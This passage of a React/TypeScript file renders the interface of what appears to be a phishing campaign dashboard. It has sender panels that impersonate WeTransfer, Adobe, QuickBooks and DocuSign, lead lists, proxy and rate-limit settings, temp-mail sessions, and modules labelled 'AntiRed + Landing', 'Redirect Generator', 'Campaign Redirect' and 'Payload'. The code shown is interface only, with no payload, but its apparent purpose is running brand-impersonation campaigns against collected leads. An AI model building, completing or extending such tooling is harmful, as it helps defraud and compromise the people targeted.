                  <Field label="Adobe Client ID"><input className="input" value={credentials.adobe.clientId} onChange={(e) => setCredentials((p) => ({ ...p, adobe: { ...p.adobe, clientId: e.target.value } }))} /></Field>
                  <Field label="Adobe Tenant"><input className="input" value={credentials.adobe.tenant} onChange={(e) => setCredentials((p) => ({ ...p, adobe: { ...p.adobe, tenant: e.target.value } }))} /></Field>
                  <Field label="QuickBooks Company ID"><input className="input" value={credentials.quickbooks.companyId} onChange={(e) => setCredentials((p) => ({ ...p, quickbooks: { ...p.quickbooks, companyId: e.target.value } }))} /></Field>
                  <Field label="DocuSign Account ID"><input className="input" value={credentials.docusign.accountId} onChange={(e) => setCredentials((p) => ({ ...p, docusign: { ...p.docusign, accountId: e.target.value } }))} /></Field>
                </div>
              </div>
            </div>
          )}

          {activeModal === 'settings' && (
            <div className="grid sm:grid-cols-2 gap-3 text-sm">
              <Field label="Proxy"><input className="input" value={settingsState.proxy} onChange={(e) => setSettingsState((p) => ({ ...p, proxy: e.target.value }))} /></Field>
              <Field label="Default Rate Limit (sec)"><input type="number" className="input" value={settingsState.defaultDelay} onChange={(e) => setSettingsState((p) => ({ ...p, defaultDelay: Number(e.target.value || 1) }))} /></Field>
              <Field label="Default File Type"><input className="input" value={settingsState.defaultFileType} onChange={(e) => setSettingsState((p) => ({ ...p, defaultFileType: e.target.value }))} /></Field>
              <Field label="Default Temp Provider"><input className="input" value={settingsState.defaultTempProvider} onChange={(e) => setSettingsState((p) => ({ ...p, defaultTempProvider: e.target.value }))} /></Field>
            </div>
          )}

          {activeModal === 'logs' && <LogsModal logs={logs} />}

          {!['leads', 'credentials', 'settings', 'logs'].includes(activeModal) && (
            <div className="space-y-2 text-sm">
              <p className="text-slate-600">Local editable workspace for {modalTitle(activeModal)}.</p>
              <textarea
                value={moduleNotes[activeModal] || ''}
                onChange={(event) =>
                  setModuleNotes((prev) => ({
                    ...prev,
                    [activeModal]: event.target.value,
                  }))
                }
                rows={6}
                placeholder="Store local notes and config for this module..."
                className="w-full border rounded px-3 py-2"
              />
            </div>
          )}

          <div className="mt-4 flex justify-end gap-2">
            <button
              className="px-3 py-2 rounded border"
              onClick={() => {
                setActiveModal(null);
                appendLog('info', `${modalTitle(activeModal)} settings updated`, 'system');
              }}
            >
              Close
            </button>
            <button className="px-3 py-2 rounded bg-[#6C63FF] text-white" onClick={saveSession}>Save in Session</button>
          </div>
        </ModalShell>
      )}

      {showStopConfirm && (
        <ModalShell title="Stop campaign?" onClose={() => setShowStopConfirm(false)}>
          <p className="text-sm text-slate-600">This will stop the current run. Sent leads stay sent, unsent leads remain pending for resume.</p>
          <div className="mt-4 flex justify-end gap-2">
            <button className="px-3 py-2 rounded border" onClick={() => setShowStopConfirm(false)}>Cancel</button>
            <button className="px-3 py-2 rounded bg-red-600 text-white" onClick={confirmStop}>Confirm Stop</button>
          </div>
        </ModalShell>
      )}

      <div className="fixed top-3 right-3 space-y-2 z-50">
        {toasts.map((toast) => (
          <div key={toast.id} className="px-3 py-2 rounded shadow text-xs text-white" style={{ background: levelColor(toast.level) }}>
            {toast.message}
          </div>
        ))}
      </div>
    </div>
  );
}

function StatCard({ label, value, tone = 'default' }: { label: string; value: React.ReactNode; tone?: 'default' | 'success' | 'warning' | 'danger' }) {
  const toneClass =
    tone === 'success' ? 'text-emerald-600' : tone === 'warning' ? 'text-amber-600' : tone === 'danger' ? 'text-red-600' : 'text-slate-900';

  return (
    <div className="bg-white rounded-lg shadow-sm border border-slate-200 p-3">
      <p className="text-xs text-slate-500">{label}</p>
      <p className={`text-xl font-semibold mt-1 ${toneClass}`}>{value}</p>
    </div>
  );
}

function Panel({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="bg-white rounded-lg border border-slate-200 shadow-sm p-4">
      <h3 className="font-semibold text-sm mb-3">{title}</h3>
      {children}
    </div>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <label className="block">
      <span className="text-xs text-slate-500 mb-1 block">{label}</span>
      {children}
    </label>
  );
}

function MiniStat({ label, value }: { label: string; value: React.ReactNode }) {
  return (
    <div className="rounded border border-slate-200 px-2 py-2">
      <p className="text-xs text-slate-500">{label}</p>
      <p className="font-semibold">{value}</p>
    </div>
  );
}

function ModalShell({ title, onClose, children }: { title: string; onClose: () => void; children: React.ReactNode }) {
  return (
    <div className="fixed inset-0 z-40 bg-black/45 flex items-center justify-center p-4">
      <div className="w-full max-w-2xl bg-white rounded-lg shadow-xl border border-slate-200">
        <div className="h-12 px-4 border-b border-slate-200 flex items-center justify-between">
          <h3 className="font-semibold text-sm">{title}</h3>
          <button onClick={onClose}>
            <X className="w-4 h-4" />
          </button>
        </div>
        <div className="p-4">{children}</div>
      </div>
    </div>
  );
}

function LogsModal({ logs }: { logs: RuntimeLog[] }) {
  const [senderFilter, setSenderFilter] = React.useState<'all' | SenderKey | 'system'>('all');
  const [levelFilter, setLevelFilter] = React.useState<'all' | LogLevel>('all');

  const filtered = logs.filter((log) => {
    const senderOk = senderFilter === 'all' || log.sender === senderFilter;
    const levelOk = levelFilter === 'all' || log.level === levelFilter;
    return senderOk && levelOk;
  });

  return (
    <div className="space-y-3 text-sm">
      <div className="grid sm:grid-cols-2 gap-2">
        <select className="input" value={senderFilter} onChange={(e) => setSenderFilter(e.target.value as 'all' | SenderKey | 'system')}>
          {['all', 'system', 'wetransfer', 'adobe', 'quickbooks', 'docusign'].map((value) => (
            <option key={value} value={value}>{value}</option>
          ))}
        </select>
        <select className="input" value={levelFilter} onChange={(e) => setLevelFilter(e.target.value as 'all' | LogLevel)}>
          {['all', 'info', 'success', 'warning', 'error', 'stopped', 'system'].map((value) => (
            <option key={value} value={value}>{value}</option>
          ))}
        </select>
      </div>
      <button
        className="px-2 py-1 rounded border text-xs"
        onClick={() => navigator.clipboard.writeText(JSON.stringify(filtered, null, 2))}
      >
        Copy filtered logs
      </button>
      <div className="max-h-72 overflow-auto rounded border border-slate-200 p-2 font-mono text-xs space-y-1 bg-slate-50">
        {filtered.map((log) => (
          <div key={log.id}>[{formatTime(log.timestamp)}] [{log.sender}] {log.level}: {log.message}</div>
        ))}
      </div>
    </div>
  );
}

function MockSenderPanel({
  sender,
  config,
  onConfigChange,
  onLog,
}: {
  sender: SenderKey;
  config: SenderConfig;
  onConfigChange: (next: Partial<SenderConfig>) => void;
  onLog: (message: string) => void;
}) {
  const senderLabel = SENDERS.find((entry) => entry.key === sender)?.label || sender;

  return (
    <div className="grid lg:grid-cols-2 gap-4">
      <Panel title={`${senderLabel} Connection`}>
        <div className="space-y-2 text-sm">
          <label className="flex items-center gap-2">
            <input type="checkbox" checked={config.connected} onChange={(e) => onConfigChange({ connected: e.target.checked })} />
            Connected
          </label>
          <Field label="Template / Upload"><input className="input" value={config.design} onChange={(e) => onConfigChange({ design: e.target.value })} /></Field>
          <Field label="Sender Settings"><textarea rows={4} className="input" value={config.notes} onChange={(e) => onConfigChange({ notes: e.target.value })} /></Field>
        </div>
      </Panel>
      <Panel title={`${senderLabel} Simulation`}>
        <div className="space-y-2 text-sm">
          <Field label="Rate Delay (sec)"><input type="number" className="input" value={config.rateLimitDelay} onChange={(e) => onConfigChange({ rateLimitDelay: Number(e.target.value || 1) })} /></Field>
          <Field label="Run Notes"><input className="input" value={config.tempProvider} onChange={(e) => onConfigChange({ tempProvider: e.target.value })} /></Field>
          <button className="px-3 py-2 rounded bg-[#6C63FF] text-white" onClick={() => onLog(`${senderLabel} mock settings updated`)}>
            Apply Mock Config
          </button>
        </div>
      </Panel>
    </div>
  );
}

function modalTitle(modal: ModalKey | null) {
  const map: Record<ModalKey, string> = {
    credentials: 'Credentials',
    leads: 'Leads Management',
    settings: 'Settings',
    logs: 'Logs',
    'attach-host': 'Attach / Host',
    rmm: '3D RMM',
    browser: '3D Browser',
    antired: 'AntiRed + Landing',
    'redirect-generator': 'Redirect Generator',
    domains: 'Domains',
    'campaign-redirect': 'Campaign Redirect',
    payload: 'Payload',
    b2b: 'B2B Sender',
    blast: '3D Blast',
  };
  return modal ? map[modal] : '';
}

function senderColor(sender: SenderKey | 'system') {
  if (sender === 'wetransfer') return '#60A5FA';
  if (sender === 'adobe') return '#F59E0B';
  if (sender === 'quickbooks') return '#34D399';
  if (sender === 'docusign') return '#F472B6';
  return '#A78BFA';
}

function levelColor(level: LogLevel) {
  if (level === 'success') return '#22C55E';
  if (level === 'warning') return '#F59E0B';
  if (level === 'error' || level === 'stopped') return '#EF4444';
  if (level === 'system') return '#A78BFA';
  return '#60A5FA';
}

function stepStatusColor(status: WeTransferStepStatus) {
  if (status === 'success') return '#22C55E';
  if (status === 'failed') return '#EF4444';
  if (status === 'running') return '#60A5FA';
  if (status === 'skipped') return '#94A3B8';
  return '#CBD5E1'; // pending
}

function stepStatusIcon(status: WeTransferStepStatus) {
  if (status === 'success') return '✓';
  if (status === 'failed') return '✗';
  if (status === 'running') return '⟳';
  if (status === 'skipped') return '—';
  return '○';
}

function WeTransferStepsPanel({ session }: { session: WeTransferSessionState }) {
  if (session.status === 'idle') {
    return (
      <Panel title="WeTransfer Execution Steps">
        <p className="text-xs text-slate-400 italic">
          Steps will appear here when you click Send. Ensure your temp-mail.io API key is set in the Connection panel above.
        </p>
      </Panel>
    );
  }

  return (
    <Panel title="WeTransfer Execution Steps">
      <div className="space-y-1">
        {session.mailbox && (
          <div className="mb-2 text-xs px-2 py-1 rounded bg-blue-50 text-blue-700 font-mono">
            Temp mailbox: {session.mailbox}
          </div>
        )}
        {session.status === 'initializing' && session.steps.length === 0 && (
          <div className="text-xs text-slate-400 italic animate-pulse">Initialising session…</div>
        )}
        {session.steps.map((step) => (
          <div key={step.id} className="flex items-start gap-2 text-xs py-1 border-b border-slate-100 last:border-0">
            <span
              className="font-mono font-bold min-w-[16px] text-center"
              style={{ color: stepStatusColor(step.status) }}
            >
              {stepStatusIcon(step.status)}
            </span>
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-2">
                <span className={step.status === 'running' ? 'font-semibold' : ''}>{step.label}</span>
                {!step.isReal && (
                  <span className="px-1 rounded bg-amber-50 text-amber-600 text-[10px]">SIMULATED</span>
                )}
                {step.isReal && step.status !== 'pending' && (
                  <span className="px-1 rounded bg-emerald-50 text-emerald-600 text-[10px]">REAL</span>
                )}
              </div>
              {step.detail && (
                <div className="text-slate-500 mt-0.5 truncate" title={step.detail}>{step.detail}</div>
              )}
            </div>
            <span className="text-slate-400 whitespace-nowrap">
              {step.timestamp ? formatTime(step.timestamp) : ''}
            </span>
          </div>
        ))}
        {session.status === 'failed' && (
          <div className="mt-2 text-xs text-red-600 font-semibold">
            Session failed. Check the log panel below.
          </div>
        )}
      </div>
    </Panel>
  );
}
